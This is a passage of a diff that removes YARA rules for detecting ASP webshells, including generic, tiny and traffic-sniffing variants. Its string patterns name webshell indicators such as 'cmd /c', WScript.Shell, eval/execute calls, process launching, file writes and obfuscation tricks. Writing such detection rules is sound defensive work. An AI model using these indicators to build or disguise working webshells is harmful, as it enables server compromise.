-        $asp_multi_payload_four3 = "loadxml" fullword nocase wide ascii
-
-        // execute cmd.exe /c with arguments using ProcessStartInfo
-        $asp_multi_payload_five1 = "ProcessStartInfo" fullword nocase wide ascii
-        $asp_multi_payload_five2 = ".Start" nocase wide ascii
-        $asp_multi_payload_five3 = ".Filename" nocase wide ascii
-        $asp_multi_payload_five4 = ".Arguments" nocase wide ascii
-
-
-        //strings from private rule capa_asp_write_file
-        // $asp_write1 = "ADODB.Stream" wide ascii # just a string, can be easily obfuscated
-        $asp_always_write1 = /\.write/ nocase wide ascii
-        $asp_always_write2 = /\.swrite/ nocase wide ascii
-        //$asp_write_way_one1 = /\.open\b/ nocase wide ascii
-        $asp_write_way_one2 = "SaveToFile" fullword nocase wide ascii
-        $asp_write_way_one3 = "CREAtEtExtFiLE" fullword nocase wide ascii
-        $asp_cr_write1 = "CreateObject(" nocase wide ascii
-        $asp_cr_write2 = "CreateObject (" nocase wide ascii
-        $asp_streamwriter1 = "streamwriter" fullword nocase wide ascii
-        $asp_streamwriter2 = "filestream" fullword nocase wide ascii
-
-    condition:
-        (
-        (
-            any of ( $tagasp_long* ) or
-            // TODO :  yara_push_private_rules.py doesn't do private rules in private rules yet
-            any of ( $tagasp_classid* ) or
-            (
-                $tagasp_short1 and
-                $tagasp_short2 in ( filesize-100..filesize )
-            ) or (
-                $tagasp_short2 and (
-                    $tagasp_short1 in ( 0..1000 ) or
-                    $tagasp_short1 in ( filesize-1000..filesize )
-                )
-            )
-        ) and not (
-            (
-                any of ( $perl* ) or
-                $php1 at 0 or
-                $php2 at 0
-            ) or (
-                ( #jsp1 + #jsp2 + #jsp3 ) > 0 and ( #jsp4 + #jsp5 + #jsp6 + #jsp7 ) > 0
-                )
-        )
-        )
-        and (
-            any of ( $asp_input* ) or
-        (
-            $asp_xml_http and
-            any of ( $asp_xml_method* )
-        ) or
-        (
-            any of ( $asp_form* ) and
-            any of ( $asp_text* ) and
-            $asp_asp
-        )
-        )
-        and not 1 of ( $fp* ) and not (
-        uint16(0) == 0x5a4d or
-        $dex at 0 or
-        $pack at 0 or
-        // fp on jar with zero compression
-        uint16(0) == 0x4b50
-        )
-        and
-        ( filesize < 700 and
-        ( (
-            any of ( $asp_payload* ) or
-        all of ( $asp_multi_payload_one* ) or
-        all of ( $asp_multi_payload_two* ) or
-        all of ( $asp_multi_payload_three* ) or
-        all of ( $asp_multi_payload_four* ) or
-        all of ( $asp_multi_payload_five* )
-        )
-        or (
-        any of ( $asp_always_write* ) and
-        (
-            any of ( $asp_write_way_one* ) and
-            any of ( $asp_cr_write* )
-        ) or (
-            any of ( $asp_streamwriter* )
-        )
-        )
-        ) )
-}
-
-rule WEBSHELL_ASP_Generic : FILE {
-    meta:
-        description = "Generic ASP webshell which uses any eval/exec function indirectly on user input or writes a file"
-        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-        author = "Arnim Rupp (https://github.com/ruppde)"
-        reference = "Internal Research"
-        date = "2021-03-07"
-        modified = "2023-07-05"
-        score = 60
-        hash = "a8c63c418609c1c291b3e731ca85ded4b3e0fba83f3489c21a3199173b176a75"
-        hash = "4cf6fbad0411b7d33e38075f5e00d4c8ae9ce2f6f53967729974d004a183b25c"
-        hash = "a91320483df0178eb3cafea830c1bd94585fc896"
-        hash = "f3398832f697e3db91c3da71a8e775ebf66c7e73"
-        id = "0904cefb-6e0f-5e5f-9986-cf83d409ce46"
-    strings:
-        $asp_much_sus7  = "Web Shell" nocase
-        $asp_much_sus8  = "WebShell" nocase
-        $asp_much_sus3  = "hidded shell"
-        $asp_much_sus4  = "WScript.Shell.1" nocase
-        $asp_much_sus5  = "AspExec"
-        $asp_much_sus14 = "\\pcAnywhere\\" nocase
-        $asp_much_sus15 = "antivirus" nocase
-        $asp_much_sus16 = "McAfee" nocase
-        $asp_much_sus17 = "nishang"
-        $asp_much_sus18 = "\"unsafe" fullword wide ascii
-        $asp_much_sus19 = "'unsafe" fullword wide ascii
-        $asp_much_sus28 = "exploit" fullword wide ascii
-        $asp_much_sus30 = "TVqQAAMAAA" wide ascii
-        $asp_much_sus31 = "HACKED" fullword wide ascii
-        $asp_much_sus32 = "hacked" fullword wide ascii
-        $asp_much_sus33 = "hacker" wide ascii
-        $asp_much_sus34 = "grayhat" nocase wide ascii
-        $asp_much_sus35 = "Microsoft FrontPage" wide ascii
-        $asp_much_sus36 = "Rootkit" wide ascii
-        $asp_much_sus37 = "rootkit" wide ascii
-        $asp_much_sus38 = "/*-/*-*/" wide ascii
-        $asp_much_sus39 = "u\"+\"n\"+\"s" wide ascii
-        $asp_much_sus40 = "\"e\"+\"v" wide ascii
-        $asp_much_sus41 = "a\"+\"l\"" wide ascii
-        $asp_much_sus42 = "\"+\"(\"+\"" wide ascii
-        $asp_much_sus43 = "q\"+\"u\"" wide ascii
-        $asp_much_sus44 = "\"u\"+\"e" wide ascii
-        $asp_much_sus45 = "/*//*/" wide ascii
-        $asp_much_sus46 = "(\"/*/\"" wide ascii
-        $asp_much_sus47 = "eval(eval(" wide ascii
-        $asp_much_sus48 = "Shell.Users" wide ascii
-        $asp_much_sus49 = "PasswordType=Regular" wide ascii
-        $asp_much_sus50 = "-Expire=0" wide ascii
-        $asp_much_sus51 = "sh\"&\"el" wide ascii
-
-        $asp_gen_sus1  = /:\s{0,20}eval}/ nocase wide ascii
-        $asp_gen_sus2  = /\.replace\(\/\w\/g/ nocase wide ascii
-        $asp_gen_sus6  = "self.delete"
-        $asp_gen_sus9  = "\"cmd /c" nocase
-        $asp_gen_sus10 = "\"cmd\"" nocase
-        $asp_gen_sus11 = "\"cmd.exe" nocase
-        $asp_gen_sus12 = "%comspec%" wide ascii
-        $asp_gen_sus13 = "%COMSPEC%" wide ascii
-        //TODO:$asp_gen_sus12 = ".UserName" nocase
-        $asp_gen_sus18 = "Hklm.GetValueNames();" nocase
-        // bonus string for proxylogon exploiting webshells
-        $asp_gen_sus19 = "http://schemas.microsoft.com/exchange/" wide ascii
-        $asp_gen_sus21 = "\"upload\"" wide ascii
-        $asp_gen_sus22 = "\"Upload\"" wide ascii
-        $asp_gen_sus25 = "shell_" wide ascii
-        //$asp_gen_sus26 = "password" fullword wide ascii
-        //$asp_gen_sus27 = "passw" fullword wide ascii
-        // own base64 or base 32 func
-        $asp_gen_sus29 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789" fullword wide ascii
-        $asp_gen_sus30 = "abcdefghijklmnopqrstuvwxyz234567" fullword wide ascii
-        $asp_gen_sus31 = "serv-u" wide ascii
-        $asp_gen_sus32 = "Serv-u" wide ascii
-        $asp_gen_sus33 = "Army" fullword wide ascii
-
-        $asp_slightly_sus1 = "<pre>" wide ascii
-        $asp_slightly_sus2 = "<PRE>" wide ascii
-
-
-        // "e"+"x"+"e"
-        $asp_gen_obf1 = "\"+\"" wide ascii
-
-        $fp1 = "DataBinder.Eval"
-        $fp2 = "B2BTools"
-        $fp3 = "<b>Failed to execute cache update. See the log file for more information" ascii
-        $fp4 = "Microsoft. All rights reserved."
-        $fp5 = "\"unsafe\"," ascii wide
-
-        //strings from private rule capa_asp
-        $tagasp_short1 = /<%[^"]/ wide ascii
-        // also looking for %> to reduce fp (yeah, short atom but seldom since special chars)
-        $tagasp_short2 = "%>" wide ascii
-
-        // classids for scripting host etc
-        $tagasp_classid1 = "72C24DD5-D70A-438B-8A42-98424B88AFB8" nocase wide ascii
-        $tagasp_classid2 = "F935DC22-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
-        $tagasp_classid3 = "093FF999-1EA0-4079-9525-9614C3504B74" nocase wide ascii
-        $tagasp_classid4 = "F935DC26-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
-        $tagasp_classid5 = "0D43FE01-F093-11CF-8940-00A0C9054228" nocase wide ascii
-        $tagasp_long10 = "<%@ " wide ascii
-        // <% eval
-        $tagasp_long11 = /<% \w/ nocase wide ascii
-        $tagasp_long12 = "<%ex" nocase wide ascii
-        $tagasp_long13 = "<%ev" nocase wide ascii
-
-        // <%@ LANGUAGE = VBScript.encode%>
-        // <%@ Language = "JScript" %>
-
-        // <%@ WebHandler Language="C#" class="Handler" %>
-        // <%@ WebService Language="C#" Class="Service" %>
-
-        // <%@Page Language="Jscript"%>
-        // <%@ Page Language = Jscript %>
-        // <%@PAGE LANGUAGE=JSCRIPT%>
-        // <%@ Page Language="Jscript" validateRequest="false" %>
-        // <%@ Page Language = Jscript %>
-        // <%@ Page Language="C#" %>
-        // <%@ Page Language="VB" ContentType="text/html" validaterequest="false" AspCompat="true" Debug="true" %>
-        // <script runat="server" language="JScript">
-        // <SCRIPT RUNAT=SERVER LANGUAGE=JSCRIPT>
-        // <SCRIPT  RUNAT=SERVER  LANGUAGE=JSCRIPT>
-        // <msxsl:script language="JScript" ...
-        $tagasp_long20 = /<(%|script|msxsl:script).{0,60}language="?(vb|jscript|c#)/ nocase wide ascii
-
-        $tagasp_long32 = /<script\s{1,30}runat=/ wide ascii
-        $tagasp_long33 = /<SCRIPT\s{1,30}RUNAT=/ wide ascii
-
-        // avoid hitting php
-        $php1 = "<?php"
-        $php2 = "<?="
-
-        // avoid hitting jsp
-        $jsp1 = "=\"java." wide ascii
-        $jsp2 = "=\"javax." wide ascii
-        $jsp3 = "java.lang." wide ascii
-        $jsp4 = "public" fullword wide ascii
-        $jsp5 = "throws" fullword wide ascii
-        $jsp6 = "getValue" fullword wide ascii
-        $jsp7 = "getBytes" fullword wide ascii
-
-        $perl1 = "PerlScript" fullword
-
-
-        //strings from private rule capa_bin_files
-        $dex   = { 64 65 ( 78 | 79 ) 0a 30 }
-        $pack  = { 50 41 43 4b 00 00 00 02 00 }
-
-        //strings from private rule capa_asp_input
-        // Request.BinaryRead
-        // Request.Form
-        $asp_input1 = "request" fullword nocase wide ascii
-        $asp_input2 = "Page_Load" fullword nocase wide ascii
-        // base64 of Request.Form(
-        $asp_input3 = "UmVxdWVzdC5Gb3JtK" fullword wide ascii
-        $asp_xml_http = "Microsoft.XMLHTTP" fullword nocase wide ascii
-        $asp_xml_method1 = "GET" fullword wide ascii
-        $asp_xml_method2 = "POST" fullword wide ascii
-        $asp_xml_method3 = "HEAD" fullword wide ascii
-        // dynamic form
-        $asp_form1 = "<form " wide ascii
-        $asp_form2 = "<Form " wide ascii
-        $asp_form3 = "<FORM " wide ascii
-        $asp_asp   = "<asp:" wide ascii
-        $asp_text1 = ".text" wide ascii
-        $asp_text2 = ".Text" wide ascii
-
-        //strings from private rule capa_asp_payload
-        $asp_payload0  = "eval_r" fullword nocase wide ascii
-        $asp_payload1  = /\beval\s/ nocase wide ascii
-        $asp_payload2  = /\beval\(/ nocase wide ascii
-        $asp_payload3  = /\beval\"\"/ nocase wide ascii
-        // var Fla = {'E':eval};  Fla.E(code)
-        $asp_payload4  = /:\s{0,10}eval\b/ nocase wide ascii
-        $asp_payload8  = /\bexecute\s?\(/ nocase wide ascii
-        $asp_payload9  = /\bexecute\s[\w"]/ nocase wide ascii
-        $asp_payload11 = "WSCRIPT.SHELL" fullword nocase wide ascii
-        $asp_payload13 = "ExecuteGlobal" fullword nocase wide ascii
-        $asp_payload14 = "ExecuteStatement" fullword nocase wide ascii
-        $asp_payload15 = "ExecuteStatement" fullword nocase wide ascii
-        $asp_multi_payload_one1 = "CreateObject" nocase fullword wide ascii
-        $asp_multi_payload_one2 = "addcode" fullword wide ascii
-        $asp_multi_payload_one3 = /\.run\b/ wide ascii
-        $asp_multi_payload_two1 = "CreateInstanceFromVirtualPath" fullword wide ascii
-        $asp_multi_payload_two2 = "ProcessRequest" fullword wide ascii
-        $asp_multi_payload_two3 = "BuildManager" fullword wide ascii
-        $asp_multi_payload_three1 = "System.Diagnostics" wide ascii
-        $asp_multi_payload_three2 = "Process" fullword wide ascii
-        $asp_multi_payload_three3 = "Start" fullword wide ascii
-        // this is about "MSXML2.DOMDocument" but since that's easily obfuscated, lets not search for it
-        $asp_multi_payload_four1 = "CreateObject" fullword nocase wide ascii
-        $asp_multi_payload_four2 = "TransformNode" fullword nocase wide ascii
-        $asp_multi_payload_four3 = "loadxml" fullword nocase wide ascii
-
-        // execute cmd.exe /c with arguments using ProcessStartInfo
-        $asp_multi_payload_five1 = "ProcessStartInfo" fullword nocase wide ascii
-        $asp_multi_payload_five2 = ".Start" nocase wide ascii
-        $asp_multi_payload_five3 = ".Filename" nocase wide ascii
-        $asp_multi_payload_five4 = ".Arguments" nocase wide ascii
-
-
-        //strings from private rule capa_asp_write_file
-        // $asp_write1 = "ADODB.Stream" wide ascii # just a string, can be easily obfuscated
-        $asp_always_write1 = /\.write/ nocase wide ascii
-        $asp_always_write2 = /\.swrite/ nocase wide ascii
-        //$asp_write_way_one1 = /\.open\b/ nocase wide ascii
-        $asp_write_way_one2 = "SaveToFile" fullword nocase wide ascii
-        $asp_write_way_one3 = "CREAtEtExtFiLE" fullword nocase wide ascii
-        $asp_cr_write1 = "CreateObject(" nocase wide ascii
-        $asp_cr_write2 = "CreateObject (" nocase wide ascii
-        $asp_streamwriter1 = "streamwriter" fullword nocase wide ascii
-        $asp_streamwriter2 = "filestream" fullword nocase wide ascii
-
-        //strings from private rule capa_asp_classid
-        $tagasp_capa_classid1 = "72C24DD5-D70A-438B-8A42-98424B88AFB8" nocase wide ascii
-        $tagasp_capa_classid2 = "F935DC22-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
-        $tagasp_capa_classid3 = "093FF999-1EA0-4079-9525-9614C3504B74" nocase wide ascii
-        $tagasp_capa_classid4 = "F935DC26-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
-        $tagasp_capa_classid5 = "0D43FE01-F093-11CF-8940-00A0C9054228" nocase wide ascii
-
-    condition:
-        //any of them or
-        (
-        (
-            any of ( $tagasp_long* ) or
-            // TODO :  yara_push_private_rules.py doesn't do private rules in private rules yet
-            any of ( $tagasp_classid* ) or
-            (
-                $tagasp_short1 and
-                $tagasp_short2 in ( filesize-100..filesize )
-            ) or (
-                $tagasp_short2 and (
-                    $tagasp_short1 in ( 0..1000 ) or
-                    $tagasp_short1 in ( filesize-1000..filesize )
-                )
-            )
-        ) and not (
-            (
-                any of ( $perl* ) or
-                $php1 at 0 or
-                $php2 at 0
-            ) or (
-                ( #jsp1 + #jsp2 + #jsp3 ) > 0 and ( #jsp4 + #jsp5 + #jsp6 + #jsp7 ) > 0
-                )
-        )
-        )
-        and not (
-        uint16(0) == 0x5a4d or
-        $dex at 0 or
-        $pack at 0 or
-        // fp on jar with zero compression
-        uint16(0) == 0x4b50
-        )
-        and (
-            any of ( $asp_input* ) or
-        (
-            $asp_xml_http and
-            any of ( $asp_xml_method* )
-        ) or
-        (
-            any of ( $asp_form* ) and
-            any of ( $asp_text* ) and
-            $asp_asp
-        )
-        )
-        and (
-            any of ( $asp_payload* ) or
-        all of ( $asp_multi_payload_one* ) or
-        all of ( $asp_multi_payload_two* ) or
-        all of ( $asp_multi_payload_three* ) or
-        all of ( $asp_multi_payload_four* ) or
-        all of ( $asp_multi_payload_five* )
-        )
-        and not any of ( $fp* ) and
-        ( ( filesize < 3KB and
-        ( 1 of ( $asp_slightly_sus* ) ) ) or
-        ( filesize < 25KB and
-        ( 1 of ( $asp_much_sus* ) or 1 of ( $asp_gen_sus* ) or
-        ( #asp_gen_obf1 > 2 ) ) ) or
-        ( filesize < 50KB and
-        ( 1 of ( $asp_much_sus* ) or 3 of ( $asp_gen_sus* ) or
-        ( #asp_gen_obf1 > 6 ) ) ) or
-        ( filesize < 150KB and
-        ( 1 of ( $asp_much_sus* ) or 4 of ( $asp_gen_sus* ) or
-        ( #asp_gen_obf1 > 6 ) or
-        ( (
-        any of ( $asp_always_write* ) and
-        (
-            any of ( $asp_write_way_one* ) and
-            any of ( $asp_cr_write* )
-        ) or (
-            any of ( $asp_streamwriter* )
-        )
-        )
-        and
-        ( 1 of ( $asp_much_sus* ) or 2 of ( $asp_gen_sus* ) or
-        ( #asp_gen_obf1 > 3 ) ) ) ) ) or
-        ( filesize < 100KB and (
-        any of ( $tagasp_capa_classid* )
-        )
-        ) )
-}
-
-rule WEBSHELL_ASP_Sniffer
-{
-    meta:
-        description = "ASP webshell which can sniff local traffic"
-        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-        author = "Arnim Rupp (https://github.com/ruppde)"
-        reference = "Internal Research"
-        score = 75
-        date = "2021/03/14"
-        modified = "2023-07-05"
-        hash = "1206c22de8d51055a5e3841b4542fb13aa0f97dd"
-        hash = "60d131af1ed23810dbc78f85ee32ffd863f8f0f4"
-        hash = "c3bc4ab8076ef184c526eb7f16e08d41b4cec97e"
-        hash = "ed5938c04f61795834751d44a383f8ca0ceac833"
-
-        id = "b5704c19-fce1-5210-8185-4839c1c5a344"
-    strings:
-        $sniff1 = "Socket(" wide ascii
-        $sniff2 = ".Bind(" wide ascii
-        $sniff3 = ".SetSocketOption(" wide ascii
-        $sniff4 = ".IOControl(" wide ascii
-        $sniff5 = "PacketCaptureWriter" fullword wide ascii
-
-        //strings from private rule capa_asp
-        $tagasp_short1 = /<%[^"]/ wide ascii
-        // also looking for %> to reduce fp (yeah, short atom but seldom since special chars)
-        $tagasp_short2 = "%>" wide ascii
-
-        // classids for scripting host etc
-        $tagasp_classid1 = "72C24DD5-D70A-438B-8A42-98424B88AFB8" nocase wide ascii
-        $tagasp_classid2 = "F935DC22-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
-        $tagasp_classid3 = "093FF999-1EA0-4079-9525-9614C3504B74" nocase wide ascii
-        $tagasp_classid4 = "F935DC26-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
-        $tagasp_classid5 = "0D43FE01-F093-11CF-8940-00A0C9054228" nocase wide ascii
-        $tagasp_long10 = "<%@ " wide ascii
-        // <% eval
-        $tagasp_long11 = /<% \w/ nocase wide ascii
-        $tagasp_long12 = "<%ex" nocase wide ascii
-        $tagasp_long13 = "<%ev" nocase wide ascii
-
-        // <%@ LANGUAGE = VBScript.encode%>
-        // <%@ Language = "JScript" %>
-
-        // <%@ WebHandler Language="C#" class="Handler" %>
-        // <%@ WebService Language="C#" Class="Service" %>
-
-        // <%@Page Language="Jscript"%>
-        // <%@ Page Language = Jscript %>
-        // <%@PAGE LANGUAGE=JSCRIPT%>
-        // <%@ Page Language="Jscript" validateRequest="false" %>
-        // <%@ Page Language = Jscript %>
-        // <%@ Page Language="C#" %>
-        // <%@ Page Language="VB" ContentType="text/html" validaterequest="false" AspCompat="true" Debug="true" %>
-        // <script runat="server" language="JScript">
-        // <SCRIPT RUNAT=SERVER LANGUAGE=JSCRIPT>
-        // <SCRIPT  RUNAT=SERVER  LANGUAGE=JSCRIPT>
-        // <msxsl:script language="JScript" ...
-        $tagasp_long20 = /<(%|script|msxsl:script).{0,60}language="?(vb|jscript|c#)/ nocase wide ascii
-
-        $tagasp_long32 = /<script\s{1,30}runat=/ wide ascii
-        $tagasp_long33 = /<SCRIPT\s{1,30}RUNAT=/ wide ascii
-
-        // avoid hitting php
-        $php1 = "<?php"
-        $php2 = "<?="
-
-        // avoid hitting jsp
-        $jsp1 = "=\"java." wide ascii
-        $jsp2 = "=\"javax." wide ascii
-        $jsp3 = "java.lang." wide ascii
-        $jsp4 = "public" fullword wide ascii
-        $jsp5 = "throws" fullword wide ascii
-        $jsp6 = "getValue" fullword wide ascii
-        $jsp7 = "getBytes" fullword wide ascii
-
-        $perl1 = "PerlScript" fullword
-
-
-        //strings from private rule capa_asp_input
-        // Request.BinaryRead
-        // Request.Form
-        $asp_input1 = "request" fullword nocase wide ascii
-        $asp_input2 = "Page_Load" fullword nocase wide ascii
-        // base64 of Request.Form(
-        $asp_input3 = "UmVxdWVzdC5Gb3JtK" fullword wide ascii
-        $asp_xml_http = "Microsoft.XMLHTTP" fullword nocase wide ascii
-        $asp_xml_method1 = "GET" fullword wide ascii
-        $asp_xml_method2 = "POST" fullword wide ascii
-        $asp_xml_method3 = "HEAD" fullword wide ascii
-        // dynamic form
-        $asp_form1 = "<form " wide ascii
-        $asp_form2 = "<Form " wide ascii
-        $asp_form3 = "<FORM " wide ascii
-        $asp_asp   = "<asp:" wide ascii
-        $asp_text1 = ".text" wide ascii
-        $asp_text2 = ".Text" wide ascii
-
-    condition:
-        (
-        (
-            any of ( $tagasp_long* ) or
-            // TODO :  yara_push_private_rules.py doesn't do private rules in private rules yet
-            any of ( $tagasp_classid* ) or
-            (
-                $tagasp_short1 and
-                $tagasp_short2 in ( filesize-100..filesize )
-            ) or (
-                $tagasp_short2 and (
-                    $tagasp_short1 in ( 0..1000 ) or
-                    $tagasp_short1 in ( filesize-1000..filesize )
-                )
-            )
-        ) and not (
-            (
-                any of ( $perl* ) or
-                $php1 at 0 or
-                $php2 at 0
-            ) or (
-                ( #jsp1 + #jsp2 + #jsp3 ) > 0 and ( #jsp4 + #jsp5 + #jsp6 + #jsp7 ) > 0
-                )
-        )
-        )
-        and (
-            any of ( $asp_input* ) or
-        (
-            $asp_xml_http and
-            any of ( $asp_xml_method* )
-        ) or
-        (
-            any of ( $asp_form* ) and
-            any of ( $asp_text* ) and
-            $asp_asp
-        )
-        )
-        and filesize < 30KB and all of ( $sniff* )
-}
-
-rule WEBSHELL_ASP_Generic_Tiny
-{
-    meta:
-        description = "Generic tiny ASP webshell which uses any eval/exec function indirectly on user input or writes a file"
-        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-        author = "Arnim Rupp (https://github.com/ruppde)"
-        reference = "Internal Research"
-        score = 75
-        date = "2021/01/07"
-        modified = "2023-07-05"
-        hash = "990e3f129b8ba409a819705276f8fa845b95dad0"
-        hash = "52ce724580e533da983856c4ebe634336f5fd13a"
-        hash = "0864f040a37c3e1cef0213df273870ed6a61e4bc"
-        hash = "b184dc97b19485f734e3057e67007a16d47b2a62"
-
-        id = "0904cefb-6e0f-5e5f-9986-cf83d409ce46"
-    strings:
-        $fp1 = "net.rim.application.ipproxyservice.AdminCommand.execute"
-
-        //strings from private rule capa_asp
-        $tagasp_short1 = /<%[^"]/ wide ascii
-        // also looking for %> to reduce fp (yeah, short atom but seldom since special chars)
-        $tagasp_short2 = "%>" wide ascii
-
-        // classids for scripting host etc
-        $tagasp_classid1 = "72C24DD5-D70A-438B-8A42-98424B88AFB8" nocase wide ascii
-        $tagasp_classid2 = "F935DC22-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
-        $tagasp_classid3 = "093FF999-1EA0-4079-9525-9614C3504B74" nocase wide ascii
-        $tagasp_classid4 = "F935DC26-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
-        $tagasp_classid5 = "0D43FE01-F093-11CF-8940-00A0C9054228" nocase wide ascii
-        $tagasp_long10 = "<%@ " wide ascii
-        // <% eval
-        $tagasp_long11 = /<% \w/ nocase wide ascii
-        $tagasp_long12 = "<%ex" nocase wide ascii
-        $tagasp_long13 = "<%ev" nocase wide ascii
-
-        // <%@ LANGUAGE = VBScript.encode%>
-        // <%@ Language = "JScript" %>
-
-        // <%@ WebHandler Language="C#" class="Handler" %>
-        // <%@ WebService Language="C#" Class="Service" %>
-
-        // <%@Page Language="Jscript"%>
-        // <%@ Page Language = Jscript %>
-        // <%@PAGE LANGUAGE=JSCRIPT%>
-        // <%@ Page Language="Jscript" validateRequest="false" %>
-        // <%@ Page Language = Jscript %>
-        // <%@ Page Language="C#" %>
-        // <%@ Page Language="VB" ContentType="text/html" validaterequest="false" AspCompat="true" Debug="true" %>
-        // <script runat="server" language="JScript">
-        // <SCRIPT RUNAT=SERVER LANGUAGE=JSCRIPT>
-        // <SCRIPT  RUNAT=SERVER  LANGUAGE=JSCRIPT>
-        // <msxsl:script language="JScript" ...
-        $tagasp_long20 = /<(%|script|msxsl:script).{0,60}language="?(vb|jscript|c#)/ nocase wide ascii
-
-        $tagasp_long32 = /<script\s{1,30}runat=/ wide ascii
-        $tagasp_long33 = /<SCRIPT\s{1,30}RUNAT=/ wide ascii
-
-        // avoid hitting php
-        $php1 = "<?php"
-        $php2 = "<?="
-
-        // avoid hitting jsp
-        $jsp1 = "=\"java." wide ascii
-        $jsp2 = "=\"javax." wide ascii
-        $jsp3 = "java.lang." wide ascii
-        $jsp4 = "public" fullword wide ascii
-        $jsp5 = "throws" fullword wide ascii
-        $jsp6 = "getValue" fullword wide ascii
-        $jsp7 = "getBytes" fullword wide ascii
-
-        $perl1 = "PerlScript" fullword
-
-
-        //strings from private rule capa_asp_input
-        // Request.BinaryRead
-        // Request.Form
-        $asp_input1 = "request" fullword nocase wide ascii
-        $asp_input2 = "Page_Load" fullword nocase wide ascii
-        // base64 of Request.Form(
-        $asp_input3 = "UmVxdWVzdC5Gb3JtK" fullword wide ascii
-        $asp_xml_http = "Microsoft.XMLHTTP" fullword nocase wide ascii
-        $asp_xml_method1 = "GET" fullword wide ascii
-        $asp_xml_method2 = "POST" fullword wide ascii
-        $asp_xml_method3 = "HEAD" fullword wide ascii
-        // dynamic form
-        $asp_form1 = "<form " wide ascii
-        $asp_form2 = "<Form " wide ascii
-        $asp_form3 = "<FORM " wide ascii
-        $asp_asp   = "<asp:" wide ascii
-        $asp_text1 = ".text" wide ascii
-        $asp_text2 = ".Text" wide ascii
-
-        //strings from private rule capa_bin_files
-        $dex   = { 64 65 ( 78 | 79 ) 0a 30 }
-        $pack  = { 50 41 43 4b 00 00 00 02 00 }
-
-        //strings from private rule capa_asp_payload
-        $asp_payload0  = "eval_r" fullword nocase wide ascii
-        $asp_payload1  = /\beval\s/ nocase wide ascii
-        $asp_payload2  = /\beval\(/ nocase wide ascii
-        $asp_payload3  = /\beval\"\"/ nocase wide ascii
-        // var Fla = {'E':eval};  Fla.E(code)
-        $asp_payload4  = /:\s{0,10}eval\b/ nocase wide ascii
-        $asp_payload8  = /\bexecute\s?\(/ nocase wide ascii
-        $asp_payload9  = /\bexecute\s[\w"]/ nocase wide ascii
-        $asp_payload11 = "WSCRIPT.SHELL" fullword nocase wide ascii
-        $asp_payload13 = "ExecuteGlobal" fullword nocase wide ascii
-        $asp_payload14 = "ExecuteStatement" fullword nocase wide ascii
-        $asp_payload15 = "ExecuteStatement" fullword nocase wide ascii
-        $asp_multi_payload_one1 = "CreateObject" nocase fullword wide ascii
-        $asp_multi_payload_one2 = "addcode" fullword wide ascii
-        $asp_multi_payload_one3 = /\.run\b/ wide ascii
-        $asp_multi_payload_two1 = "CreateInstanceFromVirtualPath" fullword wide ascii
-        $asp_multi_payload_two2 = "ProcessRequest" fullword wide ascii
-        $asp_multi_payload_two3 = "BuildManager" fullword wide ascii
-        $asp_multi_payload_three1 = "System.Diagnostics" wide ascii
-        $asp_multi_payload_three2 = "Process" fullword wide ascii
-        $asp_multi_payload_three3 = ".Start" wide ascii
-        // this is about "MSXML2.DOMDocument" but since that's easily obfuscated, lets not search for it
-        $asp_multi_payload_four1 = "CreateObject" fullword nocase wide ascii
-        $asp_multi_payload_four2 = "TransformNode" fullword nocase wide ascii
-        $asp_multi_payload_four3 = "loadxml" fullword nocase wide ascii
-
-        // execute cmd.exe /c with arguments using ProcessStartInfo
-        $asp_multi_payload_five1 = "ProcessStartInfo" fullword nocase wide ascii
-        $asp_multi_payload_five2 = ".Start" nocase wide ascii
-        $asp_multi_payload_five3 = ".Filename" nocase wide ascii
-        $asp_multi_payload_five4 = ".Arguments" nocase wide ascii
-
-
-        //strings from private rule capa_asp_write_file
-        // $asp_write1 = "ADODB.Stream" wide ascii # just a string, can be easily obfuscated
-        $asp_always_write1 = /\.write/ nocase wide ascii
-        $asp_always_write2 = /\.swrite/ nocase wide ascii
-        //$asp_write_way_one1 = /\.open\b/ nocase wide ascii
-        $asp_write_way_one2 = "SaveToFile" fullword nocase wide ascii
-        $asp_write_way_one3 = "CREAtEtExtFiLE" fullword nocase wide ascii
-        $asp_cr_write1 = "CreateObject(" nocase wide ascii
-        $asp_cr_write2 = "CreateObject (" nocase wide ascii
-        $asp_streamwriter1 = "streamwriter" fullword nocase wide ascii
-        $asp_streamwriter2 = "filestream" fullword nocase wide ascii
-
-    condition:
-        (
-        (
-            any of ( $tagasp_long* ) or
-            // TODO :  yara_push_private_rules.py doesn't do private rules in private rules yet
-            any of ( $tagasp_classid* ) or
-            (
-                $tagasp_short1 and
-                $tagasp_short2 in ( filesize-100..filesize )
-            ) or (
-                $tagasp_short2 and (
-                    $tagasp_short1 in ( 0..1000 ) or
-                    $tagasp_short1 in ( filesize-1000..filesize )
-                )
-            )
-        ) and not (
-            (
-                any of ( $perl* ) or
-                $php1 at 0 or
-                $php2 at 0
-            ) or (
-                ( #jsp1 + #jsp2 + #jsp3 ) > 0 and ( #jsp4 + #jsp5 + #jsp6 + #jsp7 ) > 0
-                )
-        )
-        )
-        and (
-            any of ( $asp_input* ) or
-        (
-            $asp_xml_http and
-            any of ( $asp_xml_method* )
-        ) or
-        (
-            any of ( $asp_form* ) and
-            any of ( $asp_text* ) and
-            $asp_asp
-        )
-        )
-        and not 1 of ( $fp* ) and not (
-        uint16(0) == 0x5a4d or
-        $dex at 0 or
-        $pack at 0 or
-        // fp on jar with zero compression
-        uint16(0) == 0x4b50
-        )
-        and
-        ( filesize < 700 and
-        ( (
-            any of ( $asp_payload* ) or
-        all of ( $asp_multi_payload_one* ) or
-        all of ( $asp_multi_payload_two* ) or
-        all of ( $asp_multi_payload_three* ) or
-        all of ( $asp_multi_payload_four* ) or
-        all of ( $asp_multi_payload_five* )
-        )
-        or (
-        any of ( $asp_always_write* ) and
-        (
-            any of ( $asp_write_way_one* ) and
-            any of ( $asp_cr_write* )
-        ) or (
